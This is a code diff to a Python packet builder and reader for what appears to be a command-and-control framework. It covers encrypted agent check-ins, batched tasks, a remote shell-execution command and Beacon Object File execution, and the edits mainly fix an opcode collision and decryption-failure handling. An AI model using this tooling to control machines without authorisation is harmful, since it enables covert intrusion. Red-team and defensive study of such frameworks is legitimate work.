@@ -28,18 +28,14 @@ PKG_FLAG_KEYEXCHANGE = 0x0010
 PKG_CMD_INITIALIZE       = 0x0001
 PKG_CMD_CHECKIN          = 0x0002
 PKG_CMD_EXIT             = 0x0003
-PKG_CMD_GET_TASKS        = 0x0100
 PKG_CMD_TASK_OUTPUT      = 0x0101
+PKG_CMD_TASK_BATCH       = 0x0105
 PKG_CMD_TASK_ERROR       = 0x0102
 PKG_CMD_TASK_COMPLETE    = 0x0103
 PKG_CMD_TASK_DROPPED     = 0x0104
+PKG_CMD_EXEC_SHELL       = 0x0110   
 PKG_CMD_BOF_EXECUTE      = 0x0400
 PKG_CMD_BOF_OUTPUT       = 0x0401
-
-# Extra commands we use for server→agent tasks (not in original header, but
-# they stay in the same ranges and are never re‑used)
-PKG_CMD_EXEC_SHELL       = 0x0110   # server → agent: run shell command
-PKG_CMD_TASK_BATCH       = 0x0100   # re‑use GET_TASKS as batch container
 
 # Agent ID hash (djb2) – fills the 4‑byte agent_id field
 def agent_id_hash(s: str) -> int:
@@ -63,7 +59,7 @@ def _encrypt_payload(key: bytes, plain: bytes) -> bytes:
     ct = AESGCM(key).encrypt(nonce, plain, None)
     return nonce + ct
 
-def _decrypt_payload(key: bytes, data: bytes) -> bytes:
+def _decrypt_payload(key: bytes, data: bytes) -> bytes | None:
     if not data:
         return b""
     if len(data) < 28:          # 12 nonce + 0 ct + 16 tag minimum
@@ -72,7 +68,7 @@ def _decrypt_payload(key: bytes, data: bytes) -> bytes:
     try:
         return AESGCM(key).decrypt(nonce, ct_tag, None)
     except InvalidTag:
-        return b""
+        return None             # explicit failure — distinguishable from b""
 
 # ---------------------------------------------------------------------------
 # PackageBuilder – constructs a single wire‑format package
@@ -135,8 +131,10 @@ class PackageBuilder:
 
         agent_hash = agent_id_hash(self.agent_id) if self.agent_id else 0
 
+        # length = (header size + payload size) - 4 (because length field excludes itself)
+        total_len = PACKAGE_HEADER_SIZE + len(payload) - 4
         header = bytearray(PACKAGE_HEADER_SIZE)
-        _BE_U32.pack_into(header, 0,  PACKAGE_HEADER_SIZE + len(payload) - 4)
+        _BE_U32.pack_into(header, 0,  total_len)
         _BE_U32.pack_into(header, 4,  PACKAGE_MAGIC)
         _BE_U16.pack_into(header, 8,  PACKAGE_PROTOCOL_VERSION)
         _BE_U16.pack_into(header, 10, flags)
@@ -173,7 +171,7 @@ class PackageReader:
             if not session_key:
                 raise ValueError("Encrypted payload but no session key")
             self._payload = _decrypt_payload(session_key, self._raw_payload)
-            if not self._payload and len(data) > PACKAGE_HEADER_SIZE:
+            if self._payload is None:   # None = decryption failed, b"" = valid empty payload
                 raise ValueError("Failed to decrypt or verify payload")
         else:
             self._payload = self._raw_payload
@@ -228,6 +226,9 @@ def parse_batch(batch_payload: bytes, session_key: bytes = b"") -> list:
     """
     Parse a batch payload (the decrypted body of a PKG_FLAG_BATCH package)
     and return a list of PackageReader objects, one per sub‑package.
+
+    session_key is only used if sub‑packages have PKG_FLAG_ENCRYPTED set,
+    which is not the default (the batch itself is encrypted, not its children).
     """
     readers = []
     offset = 0
@@ -249,22 +250,26 @@ def build_batch(top_command: int, sub_packages: list,
     """
     Create a batch package (top‑level command `top_command`, PKG_FLAG_BATCH set)
     containing the wire bytes of all `sub_packages` (PackageBuilder instances).
-    Returns the complete wire bytes ready for HTTP.
+    The sub‑packages are serialized plaintext; the outer package encrypts everything.
     """
-    batch_builder = PackageBuilder(top_command, encrypt=True, agent_id=agent_id)
-    # We'll set the BATCH flag manually later; add_pad appends raw bytes
+    # Concatenate sub‑packages as plaintext wire buffers
     payload = bytearray()
     for sub in sub_packages:
-        payload += sub.finalize(session_key)
-    # Manually construct the batch package: header + encrypted payload
-    # We could reuse PackageBuilder but need to set PKG_FLAG_BATCH.
+        # Force sub‑packages to be plaintext; the batch itself provides encryption
+        saved_encrypt = sub.encrypt
+        sub.encrypt = False
+        payload += sub.finalize(b"")   # empty key, encrypt=False → no encryption
+        sub.encrypt = saved_encrypt
+
+    # Build the batch envelope manually (we need BATCH flag + ENCRYPTED)
     flags = PKG_FLAG_ENCRYPTED | PKG_FLAG_BATCH
     agent_hash = agent_id_hash(agent_id) if agent_id else 0
 
     encrypted_payload = _encrypt_payload(session_key, bytes(payload))
 
+    total_len = PACKAGE_HEADER_SIZE + len(encrypted_payload) - 4
     header = bytearray(PACKAGE_HEADER_SIZE)
-    _BE_U32.pack_into(header, 0,  PACKAGE_HEADER_SIZE + len(encrypted_payload) - 4)
+    _BE_U32.pack_into(header, 0,  total_len)
     _BE_U32.pack_into(header, 4,  PACKAGE_MAGIC)
     _BE_U16.pack_into(header, 8,  PACKAGE_PROTOCOL_VERSION)
     _BE_U16.pack_into(header, 10, flags)
